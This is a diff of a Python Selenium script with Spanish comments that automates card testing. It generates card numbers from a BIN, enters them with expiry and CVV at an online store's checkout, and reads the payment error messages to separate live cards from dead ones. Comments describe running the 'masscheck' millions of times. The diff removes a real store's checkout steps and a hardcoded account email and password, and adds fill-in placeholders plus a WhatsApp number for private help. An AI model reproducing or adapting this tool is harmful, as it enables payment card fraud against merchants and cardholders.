@@ -56,56 +56,12 @@ def luhn_check_digit(number):
 def load_initial_page():
     try:
         print("Cargando página inicial...")
-        driver.get('https://mfu.localline.ca/mke-online-farmers-market/product/173445')
+        driver.get('https TU PAGINA ACA')
 
-        wait.until(EC.element_to_be_clickable((By.XPATH, '//*[@id="store"]/main/div[1]/div/div/div/div[2]/div[1]/div/div[2]/div/div[2]/div/button'))).click()
+        ## ACA PONES TODO COMO RELLENEAR PARA LA DIRECCION
+        ## Crear cuenta etc
 
-
-        # Espera y hace clic en el primer botón
-        wait.until(EC.element_to_be_clickable((By.XPATH, '//*[@id="storefront--fulfillment__options"]/div[2]/div[1]/button'))).click()
-
-
-        # Espera y hace clic en el segundo botón
-        wait.until(EC.element_to_be_clickable((By.XPATH, '//*[@id="storefront--fulfillment__pickup--strategy"]/div/div[1]/button'))).click()
-        time.sleep(1.5)
-
-        # Espera y hace clic en el tercer botón
-        wait.until(EC.element_to_be_clickable((By.XPATH, '//*[@id="storefront--fulfillment__pickup--date"]/div/button'))).click()
-        time.sleep(1.5)
-
-
-        # Espera y hace clic en el botón del carrito
-        wait.until(EC.element_to_be_clickable((By.XPATH, '//*[@id="store__header_actions--cart"]'))).click()
-        time.sleep(2)
-
-
-        # Espera y hace clic en el botón de login
-        wait.until(EC.element_to_be_clickable((By.XPATH, '//*[@id="storefront/store/shop/cart--login"]'))).click()
-        time.sleep(2)
-
-
-        # Envía el email
-        email_field = wait.until(EC.presence_of_element_located((By.XPATH, '//*[@id="email"]')))
-        email_field.clear()
-        email_field.send_keys('dnz@dnz.com')
-
-        # Envía la contraseña
-        password_field = wait.until(EC.presence_of_element_located((By.XPATH, '//*[@id="password"]')))
-        password_field.clear()
-        password_field.send_keys('Denz123:v')
-
-        # Espera y hace clic en el botón de login en el modal
-        wait.until(EC.element_to_be_clickable((By.XPATH, '//*[@id="storefront-login-modal"]/div/div/div[2]/button'))).click()
-
-        time.sleep(2)
-
-        driver.get('https://mfu.localline.ca/mke-online-farmers-market/checkout/delivery')
-
-        time.sleep(2)
-
-        wait.until(EC.element_to_be_clickable((By.XPATH, '/html/body/div/div/div[2]/main/div[2]/div[2]/button'))).click()
-
-        time.sleep(3)
+        
 
         
 
@@ -122,8 +78,10 @@ def execute_payment_process():
 
         driver.refresh()
 
+        #ES RECOMENDABLE REINICIAR EN ESTE execute YA QUE ES EL QUE HACE EL MASSCHEKING Y HACE TODO EL PROCESO MILLONES DE VECES
 
-        wait.until(EC.element_to_be_clickable((By.XPATH, '//*[@id="storefront/store/checkout--payment-place-button"]')))
+
+        wait.until(EC.element_to_be_clickable((By.XPATH, 'ACA TU SIG EXPATH'))).click()
 
         time.sleep(2)
 
@@ -145,9 +103,20 @@ def execute_payment_process():
         # Generar número de tarjeta ficticio
         fake_credit_card_number = generate_fake_credit_card(bin_number)
 
+
+
+
+
+
         # Rellenar el número de tarjeta
-        first_input = wait.until(EC.presence_of_element_located((By.XPATH, '//*[@id="cardNumber"]')))
+        first_input = wait.until(EC.presence_of_element_located((By.XPATH, 'ACA PONES TU XPATH DONDE VA LA CC GENERADA')))
         first_input.send_keys(fake_credit_card_number)
+
+
+
+
+
+
 
         # Obtiene el valor del input (atributo 'value')
         input_valuexd = first_input.get_attribute('value')
@@ -165,9 +134,13 @@ def execute_payment_process():
         # Sustituye 'pest1' con la clave real
         bin_date = data['pest1']["Mes"]
 
+
+
     
 
-        wait.until(EC.element_to_be_clickable((By.XPATH, '//*[@id="expirationDate"]'))).send_keys(bin_date)
+        wait.until(EC.element_to_be_clickable((By.XPATH, 'ACA TU XPATH DE TU MES, SI TIENE PARA PONES MES Y YEAR POR SEPARADO HABLAME POR PRIVADO : wa.me/+529991226696'))).send_keys(bin_date)
+
+
 
 
 
@@ -183,28 +156,39 @@ def execute_payment_process():
         # Sustituye 'pest1' con la clave real
         bin_cvvoranio = data['pest1']["A\u00f1o"]
 
+
+
+
+
+
+
         # Escribir en el tercer campo (mismo XPath que el segundo)
-        third_input = wait.until(EC.presence_of_element_located((By.XPATH, '//*[@id="cvv"]')))
+        third_input = wait.until(EC.presence_of_element_located((By.XPATH, 'ACA VA TU XPATH DE TU CVV')))
         third_input.send_keys(bin_cvvoranio)
 
         
+
+
+
+
         time.sleep(0.2)
 
         # Confirmar la orden
         driver.switch_to.default_content()
-        wait.until(EC.element_to_be_clickable((By.XPATH, '//*[@id="checkout__container"]/div[2]/div'))).click()
+        wait.until(EC.element_to_be_clickable((By.XPATH, 'ACA TU XPATH PARA DAR CLICK EN PAGAR'))).click()
 
         # Función para verificar mensaje de error
         def check_element_text():
             end_time = time.time() + 20  # 20 segundos para verificar
             while time.time() < end_time:
                 try:
+                    #ACA ES TU XPATH DONDE DA EL CODIGO DE ERROR LA PAGINA
                     element_xpath = '//*[@id="payment-error"]/div/div/ul'
                     element = wait.until(EC.presence_of_element_located((By.XPATH, element_xpath)))
                     element_text = element.text.strip()
                     print(element_text)
 
-                    # Mensajes de error posibles
+                    # Mensajes de error posibles y que si salen reiniciaran la pagina (no debes de poner los errores de live)
                     error_messages = [
                         "The card credentials are invalid",
                         "Authorization error: 'CARD_EXPIRED'",
@@ -294,4 +278,5 @@ while True:
 
 # Cerrar el navegador al finalizar
 driver.quit()
+
 
